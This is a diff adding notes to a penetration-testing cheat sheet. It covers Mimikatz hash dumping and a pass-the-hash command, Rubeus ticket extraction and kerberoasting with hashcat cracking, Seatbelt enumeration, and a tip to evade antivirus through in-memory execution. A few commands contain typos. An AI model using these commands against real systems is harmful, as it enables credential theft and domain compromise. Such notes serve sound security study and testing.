@@ -2035,9 +2035,62 @@ It is used to extract NTLM hashes and Kerberos tickets from the target's memory.
 # extract the NTLM hashes from memory
  mimikatz # sekurlsa::logonpasswords
 
+# dump all password hashed from the SAM database
+mimikatz # lsadump::sam
+
+# pass-the-hash attack to access the administrator account from a dumped hash
+mimikatx # sekurlsa:pth /user:Administrator /domain:example.com /ntlm:<ADMIN_HASH> /run:cmd.exe
+
 # extract from memory the Kerberos tickets present on the machine
 mimikatz # kerberos::list /export
 ```
+
+
+### Rubeus
+
+Rubeus is a post-exploitation tool to interact with Kerberos authentication in Windows environments.  
+It requires administrative privileges and often Domain admin or SYSTEM right for some of its attacks.  
+
+Rubeus can be used to :
+- extract and reuse Kerberos tickets (pass-the-ticket attack)
+- kerberoasting to extract service account password
+- forging Kerberos tickets
+- requesting TGT using plaintext passwords or NTLM hashes
+
+Rubeus is often flagged by antivirus solutions.  
+To avoid detection, we can use an obfuscated version or run it in memory using Cobalt Strike or execute-assembly in Meterpreter.  
+
+```shell
+# extract Kerberos tickets from memory (need admin right)
+.\Rubeus.exe dump
+
+# Kerberoast to extract service account passwords (require domain user right)
+.\Rubeus.exe kerberoast /format:hashcat
+hashcat -m 13100 -a 0 kerberoast_hashes.txt
+```
+
+
+### Seatbelt 
+
+SeatBelt is a C# tool performing several security checks on Windows systems that can be exploited for privilege escalation.  
+It automates the detection of systems misconfiguration.
+
+```shell
+# enumerate all available checks
+Seatbelt.exe all
+
+# check for high-integrity processes (Administrator or Systems permissions)
+Seatbelt.exe -group=checkselevated
+
+# list auto-run executables
+Seatbelt.exe autoruns
+```
+
+
+### PowerShell ISE (Integrated Scripting Environment)
+
+PowerShell ISE is a user-friendly GUI script development environment for PowerShell.  
+It is available by default on Windows machines and can be used to easily run PowerShell commands to elevate privileges.
 
 
 ### Aircrack-ng
